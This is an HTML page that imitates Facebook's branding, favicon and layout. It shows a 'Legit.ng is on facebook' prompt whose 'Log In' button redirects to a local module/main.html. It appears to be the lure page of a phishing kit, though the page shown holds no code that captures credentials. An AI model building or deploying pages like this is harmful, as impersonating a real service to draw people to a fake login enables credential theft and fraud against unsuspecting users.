<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        
        <!-- Css stylesheet links below -->
        <!-- Bootstrap link -->
        <link rel="stylesheet" href="module/css/bootstrap.css">
        <!-- External stylesheet -->
        <link rel="stylesheet" href="module/css/style.css">
        <link rel="stylesheet" href="module/css/structure.css">

        <link rel="icon" href="./module/img/facebooklogo.png">

        <title>Facebook</title>
    </head>
    <body>
        <!-- Parent container-->
        <div class="social-parent-con mx-auto">

            <!-- Header container -->
            <div class="social-con">
                <div class="container" >
                    <div class="col-12 col-md-11 col-lg-11 mx-auto">
                        
                        <div class="social-main-con">
                            <div class="social-top-con">
                                <div class="row align-items-center">
                                    <div class="col-12 col-md-10 col-lg-6 mx-auto">
                                        <div class="social-img"><img src="module/img/facebooklogo.png" class="img-fluid"></div>
                                        <div class="facebook-social-display facebook-social"><img src="module/img/facebooksocial.png" class="img-fluid"></div>
                                        <p class="facebook-social-display facebook-social-txt">Connect with friends and the world around you on Facebook.</p>
                                    </div>
                            
                                    <!-- Sign In container -->
                                    <div class="col-12 col-md-10 col-lg-6 mx-auto">
                                        <div class="social-input-con">
                                            <div class="img-wrap"><img src="module/img/legit.png" class="img-fluid"></div>
                                            <p class="main-txt">Legit.ng is on facebook. To connect with Legit.ng, log in or create an account.</p>
                                            <div class="ind-row">
                                                <div class="right-side one-line">About Page</div>
                                                <div class="left-side one-line">7.1M members</div>
                                            </div>
                                            
                                            <div class="col-12">
                                                <div class="social-btn" onclick="document.location.href='module/main.html'">Log In</div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            
                            
                            <div class="social-bot-con">
                                <div class="col-12 col-md-10 col-lg-6 mx-auto">
                                    <div class="social-logo mx-auto"><img src="module/img/socialfacebook.png" class="img-fluid"></div>	
                                </div>
                            </div>
                            
                        </div>
                        
                    </div>
                </div>
            </div>

        </div>
    </body>
    <!-- -------------------- -------------------- -------------------- -->
    <!-- -------------------- -------------------- -------------------- -->
    <script src="module/js/bootstrap.js"></script>
</html>
